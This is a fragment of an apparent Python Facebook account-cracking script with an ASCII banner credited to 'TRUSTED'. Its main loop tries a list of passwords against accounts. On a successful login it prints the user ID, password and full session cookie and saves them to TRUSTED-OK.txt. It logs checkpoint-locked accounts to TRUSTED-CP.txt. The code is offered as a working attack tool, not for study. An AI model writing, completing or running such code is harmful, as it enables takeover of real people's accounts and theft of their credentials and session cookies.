...
logo = """
         ...
         \033[1;37m      ##    ##   ##   ##     ##       ##    ##    ##       ##     ##
         \033[1;37m##    ##    ##  ##     ## ##    ##    ##    ##       ##     ##
         \033[1;37m    ##    ##     ##  #######   ######     ##    ######## ########   \033[1;32m JUTT\033[1;37m 
--------------------------------------------------
[•] AUTHOR     : \033[1;32mTRUSTED\033[1;37m
...
def rehan():
	...
	if gh =='1':
		...
		os.system('xdg-open https://www.facebook.com/profile.php?id=100024447517548')
	elif gh =='0':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[TRUSTED-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('TRUSTED-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[TRUSTED-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('TRUSTED-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
